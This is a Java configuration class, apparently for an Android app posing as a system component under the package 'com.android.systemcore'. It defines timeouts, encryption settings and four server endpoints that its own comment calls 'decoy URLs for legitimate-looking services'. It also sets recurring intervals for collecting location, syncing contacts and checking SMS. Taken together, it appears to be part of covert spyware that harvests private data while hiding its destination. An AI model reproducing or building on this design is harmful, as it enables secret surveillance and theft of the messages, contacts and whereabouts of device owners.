package com.android.systemcore;

/**
 * Configuration class for system core parameters
 * Contains application-wide configuration constants
 */
public class Config {
    
    // Network configuration
    public static final int COLLECTION_INTERVAL = 3600000; // 1 hour in milliseconds
    public static final int RETRY_ATTEMPTS = 3;
    public static final int CONNECTION_TIMEOUT = 30000; // 30 seconds
    public static final int READ_TIMEOUT = 45000; // 45 seconds
    
    // Feature flags
    public static final boolean ENABLE_LOGGING = true;
    public static final boolean ENCRYPTION_ENABLED = true;
    public static final boolean DEBUG_MODE = false;
    public static final boolean AUTO_UPDATE = true;
    public static final boolean CRASH_REPORTING = true;
    
    // Application metadata
    public static final String APP_VERSION = "2.3.1";
    public static final String BUILD_NUMBER = "20230815";
    public static final String APP_NAME = "SystemCore";
    public static final String PACKAGE_NAME = "com.android.systemcore";
    
    // Server endpoints (decoy URLs for legitimate-looking services)
    public static final String LOG_SERVER = "https://analytics.legitimate-app.com/logs";
    public static final String UPDATE_SERVER = "https://updates.example.org/check";
    public static final String CRASH_REPORT_SERVER = "https://crash-reports.appservices.net/submit";
    public static final String TELEMETRY_SERVER = "https://telemetry.devicestats.io/metrics";
    
    // Storage configuration
    public static final String CACHE_DIR = "systemcore_cache";
    public static final String DATA_DIR = "systemcore_data";
    public static final int MAX_CACHE_SIZE = 52428800; // 50 MB
    
    // Security settings
    public static final String ENCRYPTION_ALGORITHM = "AES/CBC/PKCS5Padding";
    public static final int KEY_SIZE = 256;
    public static final String HASH_ALGORITHM = "SHA-256";
    
    // Data collection intervals
    public static final int LOCATION_UPDATE_INTERVAL = 1800000; // 30 minutes
    public static final int CONTACT_SYNC_INTERVAL = 7200000; // 2 hours
    public static final int SMS_CHECK_INTERVAL = 600000; // 10 minutes
    
    // Limits
    public static final int MAX_RETRY_DELAY = 300000; // 5 minutes
    public static final int MAX_LOG_SIZE = 10485760; // 10 MB
    public static final int MAX_BATCH_SIZE = 100;
    
    private Config() {
        // Private constructor to prevent instantiation
    }
}